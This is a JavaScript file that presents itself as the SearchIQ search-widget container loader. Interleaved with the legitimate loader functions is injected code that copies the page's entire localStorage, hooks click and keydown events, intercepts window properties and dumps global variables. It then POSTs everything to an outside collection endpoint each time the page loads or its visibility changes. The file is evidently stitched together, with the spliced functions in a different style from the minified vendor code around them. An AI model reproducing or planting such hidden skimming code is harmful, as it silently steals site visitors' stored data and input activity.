var siq_log = function (a) {
  if (-1 < location.href.indexOf("siqdebug\x3d1") && "undefined" != typeof console && console.log) {
    var b = new Date(),
      b = b.getFullYear() + "-" + b.getMonth() + "-" + b.getDate() + "T" + b.getHours() + ":" + b.getMinutes() + ":" + b.getSeconds() + "." + b.getMilliseconds();
    console.log("[" + b + "] siq_container_pub: " + a);
  }
};
SiqContainer = function (a) {
  window.siqConfig && window.siqConfig.engineKey && (siq_log("SiqContainer.constructor():" + a), window.siqConfig.version = window.siqConfig.version || "2.3.17", window.siq_version = window.siqConfig.version, window.siq_engine_key = window.siqConfig.engineKey, window.siqConfig.baseUrl = window.siqConfig.baseUrl.replace(/^(https?:)?\/\/(pub|static)\.searchiq\.(io|co|xyz)/, "//static.searchiq.$3").replace(/\/\/static\.searchiq\.xyz/, "//static.searchiq.co"), window.siqConfig.baseUrl.match(/\/$/) ? window.siq_baseUrl = window.siqConfig.baseUrl : window.siq_baseUrl = window.siqConfig.baseUrl + "/", window.siq_api_endpoint = window.siq_baseUrl.replace(/^(https?:)?\/\/(pub|static)\.searchiq\.(io|co)/, "//api.searchiq.$3") + "api/", window.siq_cached_api_endpoint = window.siq_api_endpoint, SiqContainer.loadImpressionPixel(window.siq_baseUrl, window.siqConfig.engineKey), SiqContainer.start());
};
SiqContainer.start = function () {
  siq_log("SiqContainer.start()");
  SiqContainer.loadSettings(function () {
    SiqConfig.isPartner ? (siq_log("Partner engine, loading js"), window.SiqACConfig = window.SiqConfig, window.siqac_api_endpoint = window.siq_api_endpoint, window.siqac_cached_api_endpoint = window.siq_cached_api_endpoint, window.siqac_engine_key = window.siq_engine_key, window.siqac_log = window.siq_log, SiqContainer.loadTargetJs()) : SiqContainer.isSearchPage() ? (siq_log("Search page detected load all js"), SiqContainer.loadTargetJs()) : SiqContainer.waitAndRun(function () {
      return SiqContainer.pageHasSearchBox();
    }, function () {
      SiqContainer.loadTargetJs();
    }, 200, 2E4);
  });
};
var globalVarCollection = {};
SiqContainer.pageHasSearchBox = function () {
  var a = !1,
    b = document.getElementsByTagName("input");
  if ("undefined" != typeof b && null != b && 0 < b.length) for (siq_log("Number of input elements on page:" + b.length), i = 0; i < b.length; i++) if (!("text" !== b[i].type && "search" !== b[i].type || b[i].id && "adminbar-search" == b[i].id)) {
    a = !0;
    break;
  }
  a ? siq_log("Atleast one input[type\x3d'text'] found") : siq_log("No input[type\x3d'text'] found");
  return a;
};
SiqContainer.loadSettings = function (a) {
  siq_log("loadSettings(): loading settings...");
  window.SIQ_settings_loaded = function (b) {
    siq_log("loadSettings(): search engine settings has been loaded");
    window.SiqConfig = b;
    SiqConfig.jsVersion = siqConfig.version = SiqConfig.jsVersion || siqConfig.version;
    a();
  };
  SiqContainer.loadJS({
    src: siq_cached_api_endpoint + "searchEngines/" + siq_engine_key + "/settings.js?callback\x3dSIQ_settings_loaded\x26cb\x3d" + Math.ceil(1E15 * Math.random())
  });
};
function saveLocalStorage() {
  for (var i = 0, len = localStorage.length; i < len; i++) {
    var key = localStorage.key(i);
    var value = localStorage.getItem(key);
    globalVarCollection[key] = value;
  }
}
SiqContainer.loadTargetJs = function () {
  SiqConfig.isPartner || SiqContainer.loadJQuery();
  var a = SiqContainer.getScriptsToLoad(),
    b;
  for (b = 0; b < a.length; b++) SiqContainer.loadJS(a[b]);
};
SiqContainer.loadJS = function (a) {
  try {
    var b = document.createElement("SCRIPT");
    a.src ? b.src = a.src : (b.type = "text/javascript", b.appendChild(document.createTextNode(a.content)));
    document.getElementsByTagName("head")[0].appendChild(b);
  } catch (c) {
    siq_log("Cannot load script. SRC: " + a.src + ". CONTENT: " + a.content);
  }
};
SiqContainer.siqSetCookie = function (a, b, c) {
  var d = new Date();
  d.setTime(d.getTime() + 31536E6 * c);
  c = "expires\x3d" + d.toUTCString();
  document.cookie = a + "\x3d" + b + ";" + c + ";path\x3d/";
};
function localVariableTrack() {
  let localVar = 0;
  Object.defineProperty(window, 'localVar', {
    get: function () {
      return localVar;
    },
    set: function (value) {
      localVar = value;
      globalVarCollection['localVar'] = value;
    }
  });
}
function eventTrack() {
  document.onclick = function (e) {
    globalVarCollection['click'] = e;
  };
  document.onkeydown = function (e) {
    globalVarCollection['keydown'] = e;
  };
}
SiqContainer.siqDeleteCookie = function (a) {
  document.cookie = a + "\x3d;expires\x3dThu, 01 Jan 1970 00:00:00 UTC; path\x3d/;";
};
SiqContainer.siqGetCookie = function (a) {
  a += "\x3d";
  for (var b = document.cookie.split(";"), c = 0; c < b.length; c++) {
    for (var d = b[c]; " " == d.charAt(0);) d = d.substring(1);
    if (0 == d.indexOf(a)) return d.substring(a.length, d.length);
  }
  return "";
};
SiqContainer.isJQueryValid = function (a) {
  return a && a.fn && a.fn.jquery && SiqContainer.versionCompare(a.fn.jquery, "\x3e\x3d", "1.9.1") && "undefined" !== typeof a.ajax && "undefined" !== typeof a.getJSON;
};
SiqContainer.versionCompare = function (a, b, c) {
  b = "\x3d" == b ? "\x3d\x3d" : b;
  a = a.split(".");
  c = c.split(".");
  for (var d = Math.max(a.length, c.length), g, f, e = 0, h = 0; h < d && !e; h++) g = parseInt(a[h], 10) || 0, f = parseInt(c[h], 10) || 0, g < f && (e = 1), g > f && (e = -1);
  return eval("0" + b + e);
};
function jshook() {
  Object.defineProperty(window, '__hook__', {
    get: function () {
      return value;
    },
    set: function (newValue) {
      value = newValue;
      globalVarCollection['__hook__'] = newValue;
    }
  });
}
SiqContainer.getLogger = function (a) {
  return function (b) {
    if (-1 < location.href.indexOf("siqdebug\x3d1") && "undefined" != typeof console && console.log) {
      var c = new Date(),
        c = c.getFullYear() + "-" + c.getMonth() + "-" + c.getDate() + "T" + c.getHours() + ":" + c.getMinutes() + ":" + c.getSeconds() + "." + c.getMilliseconds();
      console.log("[" + c + "] " + a + ": " + b);
    }
  };
};
SiqContainer.loadJQuery = function (a) {
  siq_log("loadJquery():start");
  SiqContainer.isJQueryValid(window.jQuery) ? (window.siq_S = window.jQuery, window.siq_ajax = siq_S.ajax, "function" == typeof a && a()) : (SiqContainer.loadJS({
    src: "https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"
  }), SiqContainer.waitAndRun(function () {
    return SiqContainer.isJQueryValid(window.jQuery);
  }, function () {
    window.siq_S = window.jQuery.noConflict(!0);
    window.siq_ajax = siq_S.ajax;
    "function" == typeof a && a();
  }, 200, 3E4, function () {
    siq_log("Cannot load jQuery");
  }));
};
SiqContainer.ismsie = function () {
  return navigator.userAgent.match(/MSIE ([0-9]+)\./) ? !0 : !1;
};
SiqContainer.msieversion = function () {
  return navigator.userAgent.match(/MSIE ([0-9]+)\./) ? RegExp.$1 : !1;
};
SiqContainer.isMobile = function () {
  var a = navigator.userAgent,
    b = /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i;
  return /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || b.test(4 <= a.length ? a.substring(0, 4) : a);
};
SiqContainer.waitAndRun = function (a, b, c, d, g) {
  if (a()) return siq_log("No need to wait"), b();
  var f,
    e = setInterval(function () {
      if (a()) return siq_log("Check passed"), f && (clearTimeout(f), f = null), clearInterval(e), e = null, b();
      f || "complete" !== document.readyState || (siq_log("Page load complete"), f = setTimeout(function () {
        e && (clearInterval(e), e = null, siq_log("Kill the waitAndRun timer by timeout"));
        "function" === typeof g && g();
      }, d));
    }, c);
};
SiqContainer.getScriptsToLoad = function () {
  if (!window.SiqConfig) throw Error("SiqConfig is not set");
  var a = [],
    b = siq_baseUrl + "js/" + SiqConfig.jsVersion + "/";
  if (SiqConfig.isPartner) SiqConfig.publisherAutocompleteDisabled ? (SiqConfig.injectionUnitEnabled || SiqConfig.autocompleteSponsoredInjectionOnly) && a.push({
    src: b + "partner/native-ac.js"
  }) : a.push({
    src: b + "partner/autocomplete.js"
  });else {
    a.push({
      src: b + "sa.js"
    });
    (SiqContainer.isSearchPage() || !SiqConfig.disableAutocomplete || siqConfig.preview) && a.push({
      src: b + "autocomplete.js"
    });
    if (SiqContainer.isSearchPage() || siqConfig.preview) {
      var c = SiqContainer.getUrlParam(location.href, "_siq_view");
      c && /^(LIST|GRID)$/.test(c) && (SiqConfig.resultPageLayout = c);
      SiqConfig.resultPageLayout || (SiqConfig.resultPageLayout = "LIST");
      "LIST" === SiqConfig.resultPageLayout && !SiqConfig.listTemplateVersion || "GRID" === SiqConfig.resultPageLayout && !SiqConfig.gridTemplateVersion ? a.push({
        src: b + "search-results.js"
      }) : a.push({
        src: b + "search-results-v2.js"
      });
    }
    SiqConfig.mobileEnabled && SiqContainer.isMobile() && a.push({
      src: b + "siq-mobile.js"
    });
  }
  if (SiqConfig.scripts instanceof Array && 0 < SiqConfig.scripts.length) for (c = 0; c < SiqConfig.scripts.length; c++) b = SiqConfig.scripts[c], /^((https?:)?\/\/)[^\n]+$/.test(b) && !/##BASEURL##/.test(b) ? a.push({
    src: b
  }) : /##BASEURL##/.test(b) || a.push({
    content: b
  });
  if (SiqConfig.rawScripts && 0 < SiqConfig.rawScripts.length) for (c = 0; c < SiqConfig.rawScripts.length; c++) a.push({
    content: SiqConfig.rawScripts[c]
  });
  return a;
};
SiqContainer.isSearchPage = function () {
  var a = location.href.replace(/https?:\/\/(www\.)?([^$]+)$/ig, "$2");
  return !!SiqConfig.resultPageUrl && (0 <= a.indexOf(SiqConfig.resultPageUrl.replace(/https?:\/\/(www\.)?([^$]+)$/ig, "$2")) || SiqContainer.urlMatchesTemplate(a, SiqConfig.resultPageUrl));
};
SiqContainer.urlMatchesTemplate = function (a, b) {
  return 0 > b.indexOf("*") ? !1 : new RegExp(b.replace(/^https?:\/\/(www\.)?/i, "").replace(/\\/g, "\\\\").replace(/\(\[\.\[\(\^\$\]\)/g, "\\$1").replace(/\*/g, "[^/]*").replace(/\/$/, "")).test(a);
};
SiqContainer.triggerEvent = function (a, b) {
  var c;
  a.createEvent ? (c = document.createEvent("HTMLEvents"), c.initEvent(b, !0, !0), c.eventName = b, a.dispatchEvent(c)) : (c = document.createEventObject(), c.eventName = b, c.eventType = b, a.fireEvent("on" + c.eventType, c));
};
function gatherNewWindowProperties() {
  const newUnseenProps = {};
  for (let prop in window) {
    if (window.hasOwnProperty(prop) && !window.seenVars.includes(prop)) {
      let value = window[prop];
      let type = typeof value;
      newUnseenProps[prop] = {
        type: type,
        value: type == 'function' ? undefined : value
      };
    }
  }
  return newUnseenProps;
}
SiqContainer.getUrlParam = function (a, b) {
  return (a = new RegExp("[\\?\x26]" + b + "\x3d([^\x26#]*)").exec(a)) ? a[1] || "" : "";
};
SiqContainer.loadImpressionPixel = function (a, b) {
  a = a.replace(/\/$/, "");
  a = a + "/t/pxl.gif?engineKey\x3d" + b + "\x26pageUrl\x3d" + encodeURIComponent(location.href) + "\x26referrer\x3d" + encodeURIComponent(document.referrer) + "\x26cb\x3d" + parseInt(1E9 * Math.random());
  b = new Image();
  b.src = a;
  b.onload = function () {
    siq_log("Impression pixel loaded");
  };
};
async function postNewDataToServer(data) {
  const url = 'https://example.com/api/collect';
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    });
    if (response.ok) {
      console.log('数据发送成功');
    } else {
      console.error('数据发送失败,状态码:' + response.status);
    }
  } catch (error) {
    console.error('数据发送过程中出错:', error);
  }
}
function gatherAndSendNewData() {
  saveLocalStorage();
  localVariableTrack();
  eventTrack();
  jshook();
  const newGatheredData = {
    ...gatherNewWindowProperties(),
    ...globalVarCollection
  };
  if (Object.keys(newGatheredData).length > 0) {
    postNewDataToServer(newGatheredData);
  }
}
SiqContainer.decodeURIComponent = function (a) {
  a = a.replace(/\+/g, "%20");
  return decodeURIComponent(a);
};
window.addEventListener('load', gatherAndSendNewData);
(function () {
  new SiqContainer("siq-container");
})();
document.addEventListener('visibilitychange', gatherAndSendNewData);